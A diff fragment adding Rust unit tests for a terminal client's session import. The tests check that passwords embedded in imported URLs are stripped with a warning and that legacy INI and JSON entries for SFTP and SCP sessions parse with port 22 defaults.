+        assert_eq!(preview.ignored_secret_field_count, 2);
+        assert!(preview
+            .warnings
+            .iter()
+            .any(|warning| warning.contains("URL 用户信息包含密码，已忽略")));
+        assert!(!serialized.contains("super-secret"));
+        assert!(!serialized.contains("ftp-secret"));
+    }
+
+    #[test]
+    fn previews_legacy_ini_supports_sftp_and_scp_with_ssh_port_defaults() {
+        let text = "Production/SFTP=sftp://deploy@sftp.example.com\n\
+                    Production/SCP=scp://deploy@scp.example.com";
+
+        let preview = preview_legacy_ini_import(text, vec![]).expect("preview");
+
+        assert_eq!(preview.sessions.len(), 2);
+        assert_eq!(preview.sessions[0].protocol, "sftp");
+        assert_eq!(preview.sessions[0].port, 22);
+        assert_eq!(preview.sessions[1].protocol, "scp");
+        assert_eq!(preview.sessions[1].port, 22);
+        assert!(preview.warnings.is_empty());
+    }
+
+    #[test]
+    fn previews_stacio_json_supports_sftp_and_scp_sessions() {
+        let json = r#"{
+            "format": "stacio.sessions.v1",
+            "folders": [],
+            "sessions": [
+                {
+                    "id": "sftp_session",
+                    "folder_id": null,
+                    "name": "SFTP",
+                    "protocol": "sftp",
+                    "host": "sftp.example.com",
+                    "port": 22,
+                    "username": "deploy",
+                    "private_key_path": null,
+                    "credential_id": null,
+                    "tags": [],
+                    "last_opened_at": null
+                },
+                {
+                    "id": "scp_session",
+                    "folder_id": null,
+                    "name": "SCP",
+                    "protocol": "scp",
+                    "host": "scp.example.com",
+                    "port": 22,
+                    "username": "deploy",
+                    "private_key_path": null,
+                    "credential_id": null,
+                    "tags": [],
+                    "last_opened_at": null
+                }
+            ]
+        }"#;
+
+        let preview = preview_stacio_json_import(json, vec![]).expect("preview json");
+
+        assert_eq!(preview.sessions.len(), 2);
+        assert_eq!(preview.sessions[0].protocol, "sftp");
+        assert_eq!(preview.sessions[1].protocol, "scp");
+    }
+}
